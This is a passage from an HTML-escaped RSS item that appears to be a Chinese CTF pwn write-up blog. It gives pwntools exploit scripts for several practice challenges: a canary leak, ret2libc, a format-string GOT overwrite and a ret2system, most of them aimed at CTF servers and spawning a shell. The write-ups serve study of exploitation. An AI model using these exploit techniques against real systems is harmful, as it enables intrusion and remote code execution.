class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import ctypes #这里调用了一个伪随机数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27; #日志&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=ctypes.CDLL(&amp;#x27;/lib/x86_64-linux-gnu/libc.so.6&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand(1) #srand&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;while 1:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p=process(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	#p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28492)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload=b&amp;#x27;a&amp;#x27;*(0x30-0x8)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	canary=u64(p.recv(8))-0x0a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	log.info(hex(canary))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	rand=libc.rand()%1000+324&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendafter(&amp;#x27;key\n&amp;#x27;,p32(rand))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload=p64(0x4007C7)+p64(canary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendlineafter(&amp;#x27;me&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;利用 puts 得到 canary。&lt;/p&gt;
&lt;h5 id=&#34;ciscn-2019华中pwn1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn-2019华中pwn1&#34;&gt;#&lt;/a&gt; [CISCN 2019 华中] PWN1&lt;/h5&gt;
&lt;p&gt;常规 ret2libc 直接打&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(arch=&amp;#x27;amd64&amp;#x27;, os=&amp;#x27;linux&amp;#x27;, log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#io = process(&amp;#x27;./CISCN_PWN1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#io = process(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28793)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Padding = b&amp;#x27;\x00&amp;#x27; + b&amp;#x27;A&amp;#x27; * (0x50 + 0x08 - 0x01)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt = elf.plt[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got = elf.got[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main = elf.sym[&amp;#x27;main&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi = 0x400C83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret = 0x4006B9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;choice!\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(b&amp;#x27;1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;encrypted\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload = Padding + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(Payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;Ciphertext\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr = u64(io.recvuntil(b&amp;#x27;\x7f&amp;#x27;)[:6].ljust(8, b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(hex(addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = LibcSearcher(&amp;#x27;puts&amp;#x27;, addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_addr = addr-libc.dump(&amp;#x27;puts&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr = libc_addr+libc.dump(&amp;#x27;system&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh_addr = libc_addr+libc.dump(&amp;#x27;str_bin_sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;choice!\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(b&amp;#x27;1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;encrypted\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload_2 = Padding + p64(ret) + p64(rdi) + p64(sh_addr) + p64(system_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(Payload_2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;moectf-2022babyfmt&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#moectf-2022babyfmt&#34;&gt;#&lt;/a&gt; [MoeCTF 2022]babyfmt&lt;/h5&gt;
&lt;p&gt;查看到这个题很简单的处理方法，里面有个 printf (buf) 可以直接判断为字符串溢出，没开 FULL，基本思路就是格式化字符串劫持 got 表，找到偏移之后试了几种修改，改发可以说是多种多样了。接收 backdoor 没啥用，可以改 got 表直接用 system 的 got 表就行，如果开 FULL RELRO 的话可以覆盖 ret 地址，给的地址还有点用&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p=process(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28523)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print_got=elf.got[&amp;#x27;printf&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&amp;quot;\n&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(&amp;quot;%10$s&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;baskdoor=int(p.recv(9),16)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=fmtstr_payload(11,&amp;#123;print_got:baskdoor&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;ciscn_2019_ne_5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn_2019_ne_5&#34;&gt;#&lt;/a&gt; ciscn_2019_ne_5&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;注意 scanf 里面也给了 sh 和 system 直接打&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;./ciscn_2019_ne_5&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;quot;node4.buuoj.cn&amp;quot;,25421)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p=process(&amp;quot;./ciscn_2019_ne_5&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(b&amp;quot;password:&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(b&amp;quot;administrator&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system=elf.sym[&amp;#x27;system&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def add(text):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(b&amp;quot;:&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(b&amp;quot;1&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(b&amp;quot;nfo:&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def et():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(b&amp;quot;:&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(b&amp;quot;4&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x48+4)+p32(system)+b&amp;#x27;\x01\x01\x01\x01&amp;#x27;+p32(0x80482ea)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;et()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
 ]]></description>
        </item>
    </channel>
</rss>
